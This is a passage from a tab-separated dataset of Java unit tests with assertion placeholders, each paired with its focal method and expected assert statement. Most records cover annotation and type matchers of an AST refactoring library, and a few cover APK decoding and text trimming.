montoTotal() { double totalSueldos = 0;  for (int i = 0; i < posicion; i++) { totalSueldos += empleados[i].getSalario();  }  return totalSueldos; }"	assertEquals(esperado,obtenido,0.00001)
"IOException { ApkModule apkModule = getApkModule(); Assert.""<AssertPlaceHolder>""; File dir = TestUtils.getTempDir(); dir = new File(dir, ""decode_xml""); ApkModuleXmlDecoder decoder = new ApkModuleXmlDecoder(apkModule); decoder.decode(dir); mDir_xml = dir; }
getApkModule(); public void setApkLogger(APKLogger apkLogger) { this.apkLogger = apkLogger; }"	assertNotNull(apkModule)
"IOException { ApkModule apkModule = getApkModule(); Assert.""<AssertPlaceHolder>""; File dir = TestUtils.getTempDir(); dir = new File(dir, ""decode_json""); ApkModuleJsonDecoder decoder = new ApkModuleJsonDecoder(apkModule); decoder.decode(dir); mDir_json = dir; }
getApkModule(); public void setApkLogger(APKLogger apkLogger) { this.apkLogger = apkLogger; }"	assertNotNull(apkModule)
"testTrim() { String s = ""7月9日，认识了一个男人，他跟我聊叔本华，聊弗洛伊，聊庄子妻死，聊伽罗瓦和近世代数，聊彭罗斯和宇宙督察假说\n"" + ""\n"" + ""7月10日，我让他b站关注嘉然今天吃什么""; int trimmedLength = ArticleCompareUtil.textLength(ArticleCompareUtil.trim(s)); ""<AssertPlaceHolder>""; }
trim(String s) { String stopWord = ""[\\pP\\p{Punct}]""; s = s.replaceAll(""\\s*"", """"); //去除控制字符 s = s.replaceAll(""\\p{Cf}"", """"); //去除零宽空格等 s = s.replaceAll(""/[\\u200b-\\u200f\\ufeff\\u202a-\\u202e]/g"", """"); s = s.replaceAll(stopWord, """"); return s; }"	assertEquals(66, trimmedLength)
"testAnnotationSimpleName() { // Given String annotation = ""import org.alfasoftware.astra.exampleTypes.AnnotationA;\r\b"" + ""@AnnotationA\r\b"" + ""class x{}""; Matcher matcher = AnnotationMatcher.builder() .withFullyQualifiedName(""org.alfasoftware.astra.exampleTypes.AnnotationA"") .build();  // When ClassVisitor visitor = parse(annotation);  // Then List<MarkerAnnotation> annotations = visitor.getMarkerAnnotations(); Assert.""<AssertPlaceHolder>""; }
matches(ASTNode node) { Annotation annotation = (Annotation) node;  // Check annotation name ITypeBinding annotationTypeBinding = annotation.getTypeName().resolveTypeBinding(); boolean typeNameMatches = annotationTypeBinding != null && annotationTypeBinding.getQualifiedName().equals(annotationBuilder.annotationName); if (! typeNameMatches) { return false; }  // Check annotation properties if (annotationBuilder.properties != null) { if (node instanceof SingleMemberAnnotation) { SingleMemberAnnotation singleMemberAnnotation = (SingleMemberAnnotation) node; if (! checkProperties(singleMemberAnnotation)) { return false; } } else if (node instanceof NormalAnnotation) { NormalAnnotation normalAnnotation = (NormalAnnotation) node; if (! checkProperties(normalAnnotation)) { return false; } } }  // Check annotation predicate return ! annotationBuilder.annotationPredicate.isPresent() || annotationBuilder.annotationPredicate.get().test((Annotation) node); }"	assertTrue(matcher.matches(annotations.get(0)))
"testAnnotationSimpleNameWithNoMatch() { // Given String annotation = ""import org.alfasoftware.astra.exampleTypes.AnnotationA;\r\b"" + ""@AnnotationA\r\b"" + ""class x{}""; Matcher matcher = AnnotationMatcher.builder() .withFullyQualifiedName(""com.foo.AnnotationA"") .build();  // When ClassVisitor visitor = parse(annotation);  // Then List<MarkerAnnotation> annotations = visitor.getMarkerAnnotations(); Assert.""<AssertPlaceHolder>""; }
matches(ASTNode node) { Annotation annotation = (Annotation) node;  // Check annotation name ITypeBinding annotationTypeBinding = annotation.getTypeName().resolveTypeBinding(); boolean typeNameMatches = annotationTypeBinding != null && annotationTypeBinding.getQualifiedName().equals(annotationBuilder.annotationName); if (! typeNameMatches) { return false; }  // Check annotation properties if (annotationBuilder.properties != null) { if (node instanceof SingleMemberAnnotation) { SingleMemberAnnotation singleMemberAnnotation = (SingleMemberAnnotation) node; if (! checkProperties(singleMemberAnnotation)) { return false; } } else if (node instanceof NormalAnnotation) { NormalAnnotation normalAnnotation = (NormalAnnotation) node; if (! checkProperties(normalAnnotation)) { return false; } } }  // Check annotation predicate return ! annotationBuilder.annotationPredicate.isPresent() || annotationBuilder.annotationPredicate.get().test((Annotation) node); }"	assertFalse(matcher.matches(annotations.get(0)))
"testAnnotationWithSingleStringPropertyWithoutExplicitKey() { // Given String annotation = ""import org.alfasoftware.astra.exampleTypes.AnnotationA;\r\b"" + ""@AnnotationA(""test"")\r\n"" + ""class x{}""; Matcher matcher = AnnotationMatcher.builder() .withFullyQualifiedName(""org.alfasoftware.astra.exampleTypes.AnnotationA"") .withValue(""test"") .build();  // When ClassVisitor visitor = parse(annotation);  // Then List<SingleMemberAnnotation> annotations = visitor.getSingleMemberAnnotations(); Assert.""<AssertPlaceHolder>""; }
matches(ASTNode node) { Annotation annotation = (Annotation) node;  // Check annotation name ITypeBinding annotationTypeBinding = annotation.getTypeName().resolveTypeBinding(); boolean typeNameMatches = annotationTypeBinding != null && annotationTypeBinding.getQualifiedName().equals(annotationBuilder.annotationName); if (! typeNameMatches) { return false; }  // Check annotation properties if (annotationBuilder.properties != null) { if (node instanceof SingleMemberAnnotation) { SingleMemberAnnotation singleMemberAnnotation = (SingleMemberAnnotation) node; if (! checkProperties(singleMemberAnnotation)) { return false; } } else if (node instanceof NormalAnnotation) { NormalAnnotation normalAnnotation = (NormalAnnotation) node; if (! checkProperties(normalAnnotation)) { return false; } } }  // Check annotation predicate return ! annotationBuilder.annotationPredicate.isPresent() || annotationBuilder.annotationPredicate.get().test((Annotation) node); }"	assertTrue(matcher.matches(annotations.get(0)))
"testAnnotationWithSingleIntegerPropertyWithoutExplicitKey() { // Given String annotation = ""import org.alfasoftware.astra.exampleTypes.AnnotationA;\r\b"" + ""@AnnotationA(2)\r\n"" + ""class x{}""; Matcher matcher = AnnotationMatcher.builder() .withFullyQualifiedName(""org.alfasoftware.astra.exampleTypes.AnnotationA"") .withValue(2) .build();  // When ClassVisitor visitor = parse(annotation);  // Then List<SingleMemberAnnotation> annotations = visitor.getSingleMemberAnnotations(); Assert.""<AssertPlaceHolder>""; }
matches(ASTNode node) { Annotation annotation = (Annotation) node;  // Check annotation name ITypeBinding annotationTypeBinding = annotation.getTypeName().resolveTypeBinding(); boolean typeNameMatches = annotationTypeBinding != null && annotationTypeBinding.getQualifiedName().equals(annotationBuilder.annotationName); if (! typeNameMatches) { return false; }  // Check annotation properties if (annotationBuilder.properties != null) { if (node instanceof SingleMemberAnnotation) { SingleMemberAnnotation singleMemberAnnotation = (SingleMemberAnnotation) node; if (! checkProperties(singleMemberAnnotation)) { return false; } } else if (node instanceof NormalAnnotation) { NormalAnnotation normalAnnotation = (NormalAnnotation) node; if (! checkProperties(normalAnnotation)) { return false; } } }  // Check annotation predicate return ! annotationBuilder.annotationPredicate.isPresent() || annotationBuilder.annotationPredicate.get().test((Annotation) node); }"	assertTrue(matcher.matches(annotations.get(0)))
"testAnnotationWithSingleIntegerPropertyWithoutExplicitKeyAndWrongName() { // Given String annotation = ""import org.alfasoftware.astra.exampleTypes.AnnotationA;\r\b"" + ""@AnnotationA(2)\r\n"" + ""class x{}""; Matcher matcher = AnnotationMatcher.builder() .withFullyQualifiedName(""Annotation2"") .withValue(2) .build();  // When ClassVisitor visitor = parse(annotation);  // Then List<SingleMemberAnnotation> annotations = visitor.getSingleMemberAnnotations(); Assert.""<AssertPlaceHolder>""; }
matches(ASTNode node) { Annotation annotation = (Annotation) node;  // Check annotation name ITypeBinding annotationTypeBinding = annotation.getTypeName().resolveTypeBinding(); boolean typeNameMatches = annotationTypeBinding != null && annotationTypeBinding.getQualifiedName().equals(annotationBuilder.annotationName); if (! typeNameMatches) { return false; }  // Check annotation properties if (annotationBuilder.properties != null) { if (node instanceof SingleMemberAnnotation) { SingleMemberAnnotation singleMemberAnnotation = (SingleMemberAnnotation) node; if (! checkProperties(singleMemberAnnotation)) { return false; } } else if (node instanceof NormalAnnotation) { NormalAnnotation normalAnnotation = (NormalAnnotation) node; if (! checkProperties(normalAnnotation)) { return false; } } }  // Check annotation predicate return ! annotationBuilder.annotationPredicate.isPresent() || annotationBuilder.annotationPredicate.get().test((Annotation) node); }"	assertFalse(matcher.matches(annotations.get(0)))
"testAnnotationWithSingleStringPropertyWithExplicitKey() { // Given String annotation = ""import org.alfasoftware.astra.exampleTypes.AnnotationA;\r\b"" + ""@AnnotationA(marker = ""test"")\r\n"" + ""class x{}""; Matcher matcher = AnnotationMatcher.builder() .withFullyQualifiedName(""org.alfasoftware.astra.exampleTypes.AnnotationA"") .withWithMemberAndValue(""marker"", ""test"") .build();  // When ClassVisitor visitor = parse(annotation);  // Then List<NormalAnnotation> annotations = visitor.getNormalAnnotations(); Assert.""<AssertPlaceHolder>""; }
matches(ASTNode node) { Annotation annotation = (Annotation) node;  // Check annotation name ITypeBinding annotationTypeBinding = annotation.getTypeName().resolveTypeBinding(); boolean typeNameMatches = annotationTypeBinding != null && annotationTypeBinding.getQualifiedName().equals(annotationBuilder.annotationName); if (! typeNameMatches) { return false; }  // Check annotation properties if (annotationBuilder.properties != null) { if (node instanceof SingleMemberAnnotation) { SingleMemberAnnotation singleMemberAnnotation = (SingleMemberAnnotation) node; if (! checkProperties(singleMemberAnnotation)) { return false; } } else if (node instanceof NormalAnnotation) { NormalAnnotation normalAnnotation = (NormalAnnotation) node; if (! checkProperties(normalAnnotation)) { return false; } } }  // Check annotation predicate return ! annotationBuilder.annotationPredicate.isPresent() || annotationBuilder.annotationPredicate.get().test((Annotation) node); }"	assertTrue(matcher.matches(annotations.get(0)))
"testAnnotationWithSingleIntegerPropertyWithExplicitKey() { // Given String annotation = ""import org.alfasoftware.astra.exampleTypes.AnnotationA;\r\b"" + ""@AnnotationA(marker = 2)\r\n"" + ""class x{}""; Matcher matcher = AnnotationMatcher.builder() .withFullyQualifiedName(""org.alfasoftware.astra.exampleTypes.AnnotationA"") .withWithMemberAndValue(""marker"", 2) .build();  // When ClassVisitor visitor = parse(annotation);  // Then List<NormalAnnotation> annotations = visitor.getNormalAnnotations(); Assert.""<AssertPlaceHolder>""; }
matches(ASTNode node) { Annotation annotation = (Annotation) node;  // Check annotation name ITypeBinding annotationTypeBinding = annotation.getTypeName().resolveTypeBinding(); boolean typeNameMatches = annotationTypeBinding != null && annotationTypeBinding.getQualifiedName().equals(annotationBuilder.annotationName); if (! typeNameMatches) { return false; }  // Check annotation properties if (annotationBuilder.properties != null) { if (node instanceof SingleMemberAnnotation) { SingleMemberAnnotation singleMemberAnnotation = (SingleMemberAnnotation) node; if (! checkProperties(singleMemberAnnotation)) { return false; } } else if (node instanceof NormalAnnotation) { NormalAnnotation normalAnnotation = (NormalAnnotation) node; if (! checkProperties(normalAnnotation)) { return false; } } }  // Check annotation predicate return ! annotationBuilder.annotationPredicate.isPresent() || annotationBuilder.annotationPredicate.get().test((Annotation) node); }"	assertTrue(matcher.matches(annotations.get(0)))
"testAnnotationWithSingleStringPropertyWithExplicitKeyAndWrongName() { // Given String annotation = ""import org.alfasoftware.astra.exampleTypes.AnnotationA;\r\b"" + ""@AnnotationA(marker = ""test"")\r\n"" + ""class x{}""; Matcher matcher = AnnotationMatcher.builder() .withFullyQualifiedName(""Annotation2"") .withWithMemberAndValue(""marker"", ""test"") .build();  // When ClassVisitor visitor = parse(annotation);  // Then List<NormalAnnotation> annotations = visitor.getNormalAnnotations(); Assert.""<AssertPlaceHolder>""; }
matches(ASTNode node) { Annotation annotation = (Annotation) node;  // Check annotation name ITypeBinding annotationTypeBinding = annotation.getTypeName().resolveTypeBinding(); boolean typeNameMatches = annotationTypeBinding != null && annotationTypeBinding.getQualifiedName().equals(annotationBuilder.annotationName); if (! typeNameMatches) { return false; }  // Check annotation properties if (annotationBuilder.properties != null) { if (node instanceof SingleMemberAnnotation) { SingleMemberAnnotation singleMemberAnnotation = (SingleMemberAnnotation) node; if (! checkProperties(singleMemberAnnotation)) { return false; } } else if (node instanceof NormalAnnotation) { NormalAnnotation normalAnnotation = (NormalAnnotation) node; if (! checkProperties(normalAnnotation)) { return false; } } }  // Check annotation predicate return ! annotationBuilder.annotationPredicate.isPresent() || annotationBuilder.annotationPredicate.get().test((Annotation) node); }"	assertFalse(matcher.matches(annotations.get(0)))
"testAnnotationWithMultiplePropertiesWithExplicitKeys() { // Given String annotation = ""import org.alfasoftware.astra.exampleTypes.AnnotationA;\r\b"" + ""@AnnotationA(marker = 2, test=""thing"", otherProperty=2.3)\r\n"" + ""class x{}""; Matcher matcher = AnnotationMatcher.builder() .withFullyQualifiedName(""org.alfasoftware.astra.exampleTypes.AnnotationA"") .withWithMemberAndValue(""marker"", 2) .withWithMemberAndValue(""test"", ""thing"") .withWithMemberAndValue(""otherProperty"", 2.3) .build();  // When ClassVisitor visitor = parse(annotation);  // Then List<NormalAnnotation> annotations = visitor.getNormalAnnotations(); Assert.""<AssertPlaceHolder>""; }
matches(ASTNode node) { Annotation annotation = (Annotation) node;  // Check annotation name ITypeBinding annotationTypeBinding = annotation.getTypeName().resolveTypeBinding(); boolean typeNameMatches = annotationTypeBinding != null && annotationTypeBinding.getQualifiedName().equals(annotationBuilder.annotationName); if (! typeNameMatches) { return false; }  // Check annotation properties if (annotationBuilder.properties != null) { if (node instanceof SingleMemberAnnotation) { SingleMemberAnnotation singleMemberAnnotation = (SingleMemberAnnotation) node; if (! checkProperties(singleMemberAnnotation)) { return false; } } else if (node instanceof NormalAnnotation) { NormalAnnotation normalAnnotation = (NormalAnnotation) node; if (! checkProperties(normalAnnotation)) { return false; } } }  // Check annotation predicate return ! annotationBuilder.annotationPredicate.isPresent() || annotationBuilder.annotationPredicate.get().test((Annotation) node); }"	assertTrue(matcher.matches(annotations.get(0)))
"testTypeMatcherForInterface() { Matcher matcher = TypeMatcher.builder().asInterface().build(); ClassVisitor visitor = parse(SIMPLE_INTERFACE); List<TypeDeclaration> typeDeclarations = visitor.getTypeDeclarations(); ""<AssertPlaceHolder>""; }
matches(ASTNode node) {  if (!(node instanceof TypeDeclaration)) { return false; } TypeDeclaration typeDeclaration = (TypeDeclaration) node;  if (! checkIsInterface(typeDeclaration)) { return false; } if (! checkIsClass(typeDeclaration)) { return false; } if (! checkTypeName(typeDeclaration)) { return false; } if (! checkClassNameRegex(typeDeclaration)) { return false; } if (! checkTypeNamePredicate(typeDeclaration)) { return false; } if (! checkInterfaces(typeDeclaration)) { return false; } if (! checkAnnotations(typeDeclaration)) { return false; } if (! checkVisibility(typeDeclaration)) { return false; } if (! checkIsStatic(typeDeclaration)) { return false; } if (! checkIsAbstract(typeDeclaration)) { return false; } if (! checkIsFinal(typeDeclaration)) { return false; } return checkSuperclass(typeDeclaration); }"	assertTrue(matcher.matches(typeDeclarations.get(0)))
"testTypeMatcherForClass() { Matcher matcher = TypeMatcher.builder().asClass().build(); ClassVisitor visitor = parse(SIMPLE_CLASS); List<TypeDeclaration> typeDeclarations = visitor.getTypeDeclarations(); ""<AssertPlaceHolder>""; }
matches(ASTNode node) {  if (!(node instanceof TypeDeclaration)) { return false; } TypeDeclaration typeDeclaration = (TypeDeclaration) node;  if (! checkIsInterface(typeDeclaration)) { return false; } if (! checkIsClass(typeDeclaration)) { return false; } if (! checkTypeName(typeDeclaration)) { return false; } if (! checkClassNameRegex(typeDeclaration)) { return false; } if (! checkTypeNamePredicate(typeDeclaration)) { return false; } if (! checkInterfaces(typeDeclaration)) { return false; } if (! checkAnnotations(typeDeclaration)) { return false; } if (! checkVisibility(typeDeclaration)) { return false; } if (! checkIsStatic(typeDeclaration)) { return false; } if (! checkIsAbstract(typeDeclaration)) { return false; } if (! checkIsFinal(typeDeclaration)) { return false; } return checkSuperclass(typeDeclaration); }"	assertTrue(matcher.matches(typeDeclarations.get(0)))
"testExactClassNameMatch() { // Given String classWithName = ""package x;"" + ""public class TestName""; Matcher matcher = TypeMatcher.builder() .asClass() .withName(""x.TestName"") .build();  // When ClassVisitor visitor = parse(classWithName);  // Then List<TypeDeclaration> typeDeclarations = visitor.getTypeDeclarations(); ""<AssertPlaceHolder>""; }
matches(ASTNode node) {  if (!(node instanceof TypeDeclaration)) { return false; } TypeDeclaration typeDeclaration = (TypeDeclaration) node;  if (! checkIsInterface(typeDeclaration)) { return false; } if (! checkIsClass(typeDeclaration)) { return false; } if (! checkTypeName(typeDeclaration)) { return false; } if (! checkClassNameRegex(typeDeclaration)) { return false; } if (! checkTypeNamePredicate(typeDeclaration)) { return false; } if (! checkInterfaces(typeDeclaration)) { return false; } if (! checkAnnotations(typeDeclaration)) { return false; } if (! checkVisibility(typeDeclaration)) { return false; } if (! checkIsStatic(typeDeclaration)) { return false; } if (! checkIsAbstract(typeDeclaration)) { return false; } if (! checkIsFinal(typeDeclaration)) { return false; } return checkSuperclass(typeDeclaration); }"	assertTrue(matcher.matches(typeDeclarations.get(0)))
"testExactClassNameDoesNotMatch() { // Given String classWithName = ""package x;"" + ""public class TestName""; Matcher matcher = TypeMatcher.builder() .asClass() .withName(""TestName2"") .build();  // When ClassVisitor visitor = parse(classWithName);  // Then List<TypeDeclaration> typeDeclarations = visitor.getTypeDeclarations(); ""<AssertPlaceHolder>""; }
matches(ASTNode node) {  if (!(node instanceof TypeDeclaration)) { return false; } TypeDeclaration typeDeclaration = (TypeDeclaration) node;  if (! checkIsInterface(typeDeclaration)) { return false; } if (! checkIsClass(typeDeclaration)) { return false; } if (! checkTypeName(typeDeclaration)) { return false; } if (! checkClassNameRegex(typeDeclaration)) { return false; } if (! checkTypeNamePredicate(typeDeclaration)) { return false; } if (! checkInterfaces(typeDeclaration)) { return false; } if (! checkAnnotations(typeDeclaration)) { return false; } if (! checkVisibility(typeDeclaration)) { return false; } if (! checkIsStatic(typeDeclaration)) { return false; } if (! checkIsAbstract(typeDeclaration)) { return false; } if (! checkIsFinal(typeDeclaration)) { return false; } return checkSuperclass(typeDeclaration); }"	assertFalse(matcher.matches(typeDeclarations.get(0)))
"testRegularExpressionClassNameMatch() { // Given String classWithName = ""package x;"" + ""public class TestName""; Matcher matcher = TypeMatcher.builder() .asClass() .withNameLike(""x.{3,5}Name"") .build();  // When ClassVisitor visitor = parse(classWithName);  // Then List<TypeDeclaration> typeDeclarations = visitor.getTypeDeclarations(); ""<AssertPlaceHolder>""; }
matches(ASTNode node) {  if (!(node instanceof TypeDeclaration)) { return false; } TypeDeclaration typeDeclaration = (TypeDeclaration) node;  if (! checkIsInterface(typeDeclaration)) { return false; } if (! checkIsClass(typeDeclaration)) { return false; } if (! checkTypeName(typeDeclaration)) { return false; } if (! checkClassNameRegex(typeDeclaration)) { return false; } if (! checkTypeNamePredicate(typeDeclaration)) { return false; } if (! checkInterfaces(typeDeclaration)) { return false; } if (! checkAnnotations(typeDeclaration)) { return false; } if (! checkVisibility(typeDeclaration)) { return false; } if (! checkIsStatic(typeDeclaration)) { return false; } if (! checkIsAbstract(typeDeclaration)) { return false; } if (! checkIsFinal(typeDeclaration)) { return false; } return checkSuperclass(typeDeclaration); }"	assertTrue(matcher.matches(typeDeclarations.get(0)))
"testRegularExpressionClassNameWithNoMatch() { // Given String classWithName = ""package x;"" + ""public class TestingName""; Matcher matcher = TypeMatcher.builder() .asClass() .withNameLike("".{3,5}Name"") .build();  // When ClassVisitor visitor = parse(classWithName);  // Then List<TypeDeclaration> typeDeclarations = visitor.getTypeDeclarations(); ""<AssertPlaceHolder>""; }
matches(ASTNode node) {  if (!(node instanceof TypeDeclaration)) { return false; } TypeDeclaration typeDeclaration = (TypeDeclaration) node;  if (! checkIsInterface(typeDeclaration)) { return false; } if (! checkIsClass(typeDeclaration)) { return false; } if (! checkTypeName(typeDeclaration)) { return false; } if (! checkClassNameRegex(typeDeclaration)) { return false; } if (! checkTypeNamePredicate(typeDeclaration)) { return false; } if (! checkInterfaces(typeDeclaration)) { return false; } if (! checkAnnotations(typeDeclaration)) { return false; } if (! checkVisibility(typeDeclaration)) { return false; } if (! checkIsStatic(typeDeclaration)) { return false; } if (! checkIsAbstract(typeDeclaration)) { return false; } if (! checkIsFinal(typeDeclaration)) { return false; } return checkSuperclass(typeDeclaration); }"	assertFalse(matcher.matches(typeDeclarations.get(0)))
"testTypeMatcherForClassImplementingInterface() { Matcher matcher = TypeMatcher.builder().asClass().implementingInterfaces(new HashSet<>(Arrays.asList(""org.alfasoftware.astra.exampleTypes.ExampleMarkerInterface""))).build(); ClassVisitor visitor = parse(CLASS_IMPLEMENTS_INTERFACE); List<TypeDeclaration> typeDeclarations = visitor.getTypeDeclarations(); ""<AssertPlaceHolder>""; }
matches(ASTNode node) {  if (!(node instanceof TypeDeclaration)) { return false; } TypeDeclaration typeDeclaration = (TypeDeclaration) node;  if (! checkIsInterface(typeDeclaration)) { return false; } if (! checkIsClass(typeDeclaration)) { return false; } if (! checkTypeName(typeDeclaration)) { return false; } if (! checkClassNameRegex(typeDeclaration)) { return false; } if (! checkTypeNamePredicate(typeDeclaration)) { return false; } if (! checkInterfaces(typeDeclaration)) { return false; } if (! checkAnnotations(typeDeclaration)) { return false; } if (! checkVisibility(typeDeclaration)) { return false; } if (! checkIsStatic(typeDeclaration)) { return false; } if (! checkIsAbstract(typeDeclaration)) { return false; } if (! checkIsFinal(typeDeclaration)) { return false; } return checkSuperclass(typeDeclaration); }"	assertTrue(matcher.matches(typeDeclarations.get(0)))
"testTypeMatcherForClassImplementingQualifiedInterface() { Matcher matcher = TypeMatcher.builder().asClass().implementingInterfaces(new HashSet<>(Arrays.asList(""org.alfasoftware.astra.exampleTypes.ExampleMarkerInterface""))).build(); ClassVisitor visitor = parse(CLASS_IMPLEMENTS_QUALIFIED_INTERFACE); List<TypeDeclaration> typeDeclarations = visitor.getTypeDeclarations(); ""<AssertPlaceHolder>""; }
matches(ASTNode node) {  if (!(node instanceof TypeDeclaration)) { return false; } TypeDeclaration typeDeclaration = (TypeDeclaration) node;  if (! checkIsInterface(typeDeclaration)) { return false; } if (! checkIsClass(typeDeclaration)) { return false; } if (! checkTypeName(typeDeclaration)) { return false; } if (! checkClassNameRegex(typeDeclaration)) { return false; } if (! checkTypeNamePredicate(typeDeclaration)) { return false; } if (! checkInterfaces(typeDeclaration)) { return false; } if (! checkAnnotations(typeDeclaration)) { return false; } if (! checkVisibility(typeDeclaration)) { return false; } if (! checkIsStatic(typeDeclaration)) { return false; } if (! checkIsAbstract(typeDeclaration)) { return false; } if (! checkIsFinal(typeDeclaration)) { return false; } return checkSuperclass(typeDeclaration); }"	assertTrue(matcher.matches(typeDeclarations.get(0)))
"testTypeMatcherForClassImplementingInterfaceAndExtendsClass() { Matcher matcher = TypeMatcher.builder().asClass().extending(B.class.getName()).build(); ClassVisitor visitor = parse(CLASS_IMPLEMENTS_INTERFACE_AND_EXTENDS_CLASS); List<TypeDeclaration> typeDeclarations = visitor.getTypeDeclarations(); ""<AssertPlaceHolder>""; }
matches(ASTNode node) {  if (!(node instanceof TypeDeclaration)) { return false; } TypeDeclaration typeDeclaration = (TypeDeclaration) node;  if (! checkIsInterface(typeDeclaration)) { return false; } if (! checkIsClass(typeDeclaration)) { return false; } if (! checkTypeName(typeDeclaration)) { return false; } if (! checkClassNameRegex(typeDeclaration)) { return false; } if (! checkTypeNamePredicate(typeDeclaration)) { return false; } if (! checkInterfaces(typeDeclaration)) { return false; } if (! checkAnnotations(typeDeclaration)) { return false; } if (! checkVisibility(typeDeclaration)) { return false; } if (! checkIsStatic(typeDeclaration)) { return false; } if (! checkIsAbstract(typeDeclaration)) { return false; } if (! checkIsFinal(typeDeclaration)) { return false; } return checkSuperclass(typeDeclaration); }"	assertTrue(matcher.matches(typeDeclarations.get(0)))
"testTypeMatcherForClassImplementingInterfaceAndExtendsClassCheckingBoth() { Matcher matcher = TypeMatcher.builder().asClass() .extending(B.class.getName()) .implementingInterfaces(new HashSet<>(Arrays.asList(""org.alfasoftware.astra.exampleTypes.ExampleMarkerInterface""))) .build(); ClassVisitor visitor = parse(CLASS_IMPLEMENTS_INTERFACE_AND_EXTENDS_CLASS); List<TypeDeclaration> typeDeclarations = visitor.getTypeDeclarations(); ""<AssertPlaceHolder>""; }
matches(ASTNode node) {  if (!(node instanceof TypeDeclaration)) { return false; } TypeDeclaration typeDeclaration = (TypeDeclaration) node;  if (! checkIsInterface(typeDeclaration)) { return false; } if (! checkIsClass(typeDeclaration)) { return false; } if (! checkTypeName(typeDeclaration)) { return false; } if (! checkClassNameRegex(typeDeclaration)) { return false; } if (! checkTypeNamePredicate(typeDeclaration)) { return false; } if (! checkInterfaces(typeDeclaration)) { return false; } if (! checkAnnotations(typeDeclaration)) { return false; } if (! checkVisibility(typeDeclaration)) { return false; } if (! checkIsStatic(typeDeclaration)) { return false; } if (! checkIsAbstract(typeDeclaration)) { return false; } if (! checkIsFinal(typeDeclaration)) { return false; } return checkSuperclass(typeDeclaration); }"	assertTrue(matcher.matches(typeDeclarations.get(0)))
"testClassExtendingSingleFullyQualifiedInterface() { // Given String fullyQualifiedInterface = ""package x;"" + ""class Test implements org.alfasoftware.astra.exampleTypes.ExampleMarkerInterface {}""; Matcher matcher = TypeMatcher.builder().asClass().implementingInterfaces(new HashSet<>(Arrays.asList(""org.alfasoftware.astra.exampleTypes.ExampleMarkerInterface""))).build();  // When ClassVisitor visitor = parse(fullyQualifiedInterface);  // Then List<TypeDeclaration> typeDeclarations = visitor.getTypeDeclarations(); ""<AssertPlaceHolder>""; }
matches(ASTNode node) {  if (!(node instanceof TypeDeclaration)) { return false; } TypeDeclaration typeDeclaration = (TypeDeclaration) node;  if (! checkIsInterface(typeDeclaration)) { return false; } if (! checkIsClass(typeDeclaration)) { return false; } if (! checkTypeName(typeDeclaration)) { return false; } if (! checkClassNameRegex(typeDeclaration)) { return false; } if (! checkTypeNamePredicate(typeDeclaration)) { return false; } if (! checkInterfaces(typeDeclaration)) { return false; } if (! checkAnnotations(typeDeclaration)) { return false; } if (! checkVisibility(typeDeclaration)) { return false; } if (! checkIsStatic(typeDeclaration)) { return false; } if (! checkIsAbstract(typeDeclaration)) { return false; } if (! checkIsFinal(typeDeclaration)) { return false; } return checkSuperclass(typeDeclaration); }"	assertTrue(matcher.matches(typeDeclarations.get(0)))
"testClassExtendingTwoFullyQualifiedInterfaces() { // Given String fullyQualifiedInterface = ""package x;"" + ""class Test implements org.alfasoftware.astra.exampleTypes.ExampleMarkerInterface, java.util.List {}""; Matcher matcher = TypeMatcher.builder() .asClass() .implementingInterfaces(new HashSet<>(Arrays.asList(""org.alfasoftware.astra.exampleTypes.ExampleMarkerInterface"", ""java.util.List""))) .build();  // When ClassVisitor visitor = parse(fullyQualifiedInterface);  // Then List<TypeDeclaration> typeDeclarations = visitor.getTypeDeclarations(); ""<AssertPlaceHolder>""; }
matches(ASTNode node) {  if (!(node instanceof TypeDeclaration)) { return false; } TypeDeclaration typeDeclaration = (TypeDeclaration) node;  if (! checkIsInterface(typeDeclaration)) { return false; } if (! checkIsClass(typeDeclaration)) { return false; } if (! checkTypeName(typeDeclaration)) { return false; } if (! checkClassNameRegex(typeDeclaration)) { return false; } if (! checkTypeNamePredicate(typeDeclaration)) { return false; } if (! checkInterfaces(typeDeclaration)) { return false; } if (! checkAnnotations(typeDeclaration)) { return false; } if (! checkVisibility(typeDeclaration)) { return false; } if (! checkIsStatic(typeDeclaration)) { return false; } if (! checkIsAbstract(typeDeclaration)) { return false; } if (! checkIsFinal(typeDeclaration)) { return false; } return checkSuperclass(typeDeclaration); }"	assertTrue(matcher.matches(typeDeclarations.get(0)))
"testClassExtendingThreeFullyQualifiedInterfaces() { // Given String fullyQualifiedInterface = ""package x;"" + ""import java.util.Formattable;"" + ""class Test implements org.alfasoftware.astra.exampleTypes.ExampleMarkerInterface, java.util.List, Formattable {}"";  Matcher matcher = TypeMatcher.builder() .asClass() .implementingInterfaces(new HashSet<>(Arrays.asList(""java.util.Formattable"", ""org.alfasoftware.astra.exampleTypes.ExampleMarkerInterface"", ""java.util.List""))) .build();  // When ClassVisitor visitor = parse(fullyQualifiedInterface);  // Then List<TypeDeclaration> typeDeclarations = visitor.getTypeDeclarations(); ""<AssertPlaceHolder>""; }
matches(ASTNode node) {  if (!(node instanceof TypeDeclaration)) { return false; } TypeDeclaration typeDeclaration = (TypeDeclaration) node;  if (! checkIsInterface(typeDeclaration)) { return false; } if (! checkIsClass(typeDeclaration)) { return false; } if (! checkTypeName(typeDeclaration)) { return false; } if (! checkClassNameRegex(typeDeclaration)) { return false; } if (! checkTypeNamePredicate(typeDeclaration)) { return false; } if (! checkInterfaces(typeDeclaration)) { return false; } if (! checkAnnotations(typeDeclaration)) { return false; } if (! checkVisibility(typeDeclaration)) { return false; } if (! checkIsStatic(typeDeclaration)) { return false; } if (! checkIsAbstract(typeDeclaration)) { return false; } if (! checkIsFinal(typeDeclaration)) { return false; } return checkSuperclass(typeDeclaration); }"	assertTrue(matcher.matches(typeDeclarations.get(0)))
"testTypeMatcherForClassExtendingClassWhichImplementsInterface() {  String child = ""package x;\r\n"" + ""import org.alfasoftware.astra.exampleTypes.A;\r\n"" + ""public class G extends A {}"";  Matcher matcher = TypeMatcher.builder().asClass().implementingInterfaces(new HashSet<>(Arrays.asList(Fooable.class.getName()))).build();  ClassVisitor visitor = parse(child); List<TypeDeclaration> typeDeclarations = visitor.getTypeDeclarations(); ""<AssertPlaceHolder>""; }
